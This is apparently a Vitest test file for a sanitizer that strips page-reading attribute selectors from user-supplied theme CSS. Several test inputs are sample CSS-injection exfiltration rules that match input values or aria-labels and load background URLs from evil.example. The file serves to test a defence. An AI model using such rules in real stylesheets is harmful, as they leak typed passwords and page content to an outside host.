import { describe, expect, it } from 'vitest';
import { readsPage, sanitizeThemeCss } from './themeSanitize';

describe('readsPage', () => {
  it('flags selectors that match on what an attribute holds', () => {
    expect(readsPage('input[value^="a"]')).toBe(true);
    expect(readsPage('input[type="password"][value$=z]')).toBe(true);
    expect(readsPage('[aria-label*="Luna"]')).toBe(true);
    expect(readsPage('a[href^="https://"]')).toBe(true);
    expect(readsPage('[data-nu-event-id="$abc"]')).toBe(true);
    expect(readsPage('div:has(input[value="x"])')).toBe(true);
    expect(readsPage('[ VALUE = "x" i ]')).toBe(true);
  });

  it("leaves the app's own presentational attributes, presence checks and plain selectors", () => {
    expect(readsPage('[data-nu-role="server-rail"]')).toBe(false);
    expect(readsPage('[data-nu-icon="paw"] svg')).toBe(false);
    expect(readsPage('[class^="nu-button"]')).toBe(false);
    expect(readsPage('[aria-selected="true"]')).toBe(false);
    expect(readsPage('input[type="password"]')).toBe(false);
    expect(readsPage('input[value]')).toBe(false);
    expect(readsPage(':root')).toBe(false);
    expect(readsPage('.nu-message > p:hover')).toBe(false);
  });
});

describe('sanitizeThemeCss', () => {
  it('leaves a theme that only sets tokens and styles roles exactly as written', () => {
    const css = `:root {\n  --nu-color-accent: #ff2f92;\n}\n/* a comment */\n[data-nu-role="server-rail"] { gap: 4px; }`;
    expect(sanitizeThemeCss(css)).toEqual({ css, removed: [] });
  });

  it('takes out rules that read the page, top level and inside @media, and says which', () => {
    const { css, removed } = sanitizeThemeCss(`
      :root { --nu-color-accent: red; }
      input[value^="a"] { background: url(https://evil.example/a); }
      @media (min-width: 1px) {
        [aria-label*="Luna"] { background: url(https://evil.example/luna); }
        .nu-x { color: blue; }
      }
    `);
    expect(removed).toEqual(['input[value^="a"]', '[aria-label*="Luna"]']);
    expect(css).not.toContain('evil.example');
    expect(css).toContain('--nu-color-accent');
    expect(css).toContain('.nu-x');
  });

  it('applies nothing for an empty theme', () => {
    expect(sanitizeThemeCss('   ')).toEqual({ css: '', removed: [] });
  });

  it('leaves no parsing stylesheet behind', () => {
    const before = document.head.querySelectorAll('style').length;
    sanitizeThemeCss('input[value="x"] { color: red }');
    expect(document.head.querySelectorAll('style').length).toBe(before);
  });
});
